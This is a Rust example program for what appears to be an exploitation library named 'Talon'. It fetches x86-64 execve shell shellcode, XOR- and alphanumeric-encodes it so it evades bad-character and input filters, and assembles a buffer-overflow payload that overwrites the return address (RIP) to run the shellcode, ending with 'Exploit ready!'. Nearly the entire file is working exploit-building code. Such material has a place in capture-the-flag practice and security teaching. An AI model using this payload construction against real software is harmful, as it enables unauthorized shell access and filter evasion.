// TALON EXAMPLE 5: Shellcode Injection
// Demonstrates: Shellcode database, encoders, injection techniques

use talon::packing_tools::p64;
use talon::shellcode_db::{get_shellcode, ShellcodeDatabase};
use talon::shellcode_encoders::{alphanumeric_encode, xor_encode};

fn main() -> Result<(), String> {
    println!("[*] Talon Shellcode Injection Example");

    // Step 1: Get shellcode from database
    let db = ShellcodeDatabase::new();

    let execve_shellcode = get_shellcode("x64_execve_sh")?;
    println!("[+] Shellcode: x64_execve_sh");
    println!("[+] Size: {} bytes", execve_shellcode.size);
    println!("[+] Description: {}", execve_shellcode.description);
    println!("[+] Raw bytes: {}", hex::encode(&execve_shellcode.bytes));

    // Step 2: Encode shellcode (if needed to avoid bad chars)
    let key = 0x42;
    let encoded = xor_encode(&execve_shellcode.bytes, key);
    println!(
        "\n[+] XOR-encoded (key=0x{:02x}): {} bytes",
        key,
        encoded.len()
    );

    // Step 3: Try alphanumeric encoding (for restricted input)
    match alphanumeric_encode(&execve_shellcode.bytes) {
        Ok(alpha) => {
            println!("[+] Alphanumeric encoded: {} bytes", alpha.len());
            println!("[+] Safe for most input filters!");
        }
        Err(e) => println!("[-] Alphanumeric encoding not optimal: {}", e),
    }

    // Step 4: Alternative shellcodes
    println!("\n[*] Other available shellcodes:");
    for sc in db.list_by_arch("x86-64") {
        println!("    - {}: {} ({} bytes)", sc.name, sc.description, sc.size);
    }

    // Step 5: Injection technique
    println!("\n[*] Injection Technique:");
    println!("    Method 1: Direct RIP control");
    let offset = 64;
    let shellcode_addr = 0x00601000_u64;

    let mut payload = execve_shellcode.bytes.clone();
    payload.resize(offset, 0x90); // NOP sled
    payload.extend_from_slice(&p64(shellcode_addr));

    println!(
        "    - Place shellcode at known address: 0x{:x}",
        shellcode_addr
    );
    println!("    - Overflow buffer to overwrite RIP");
    println!("    - RIP = 0x{:x} -> execute shellcode", shellcode_addr);

    println!("\n    Method 2: NOP sled");
    println!("    - Create large NOP sled (0x90 bytes)");
    println!("    - Append shellcode at end");
    println!("    - Jump anywhere in sled -> slides to shellcode");

    println!("\n[+] Exploit ready!");

    Ok(())
}
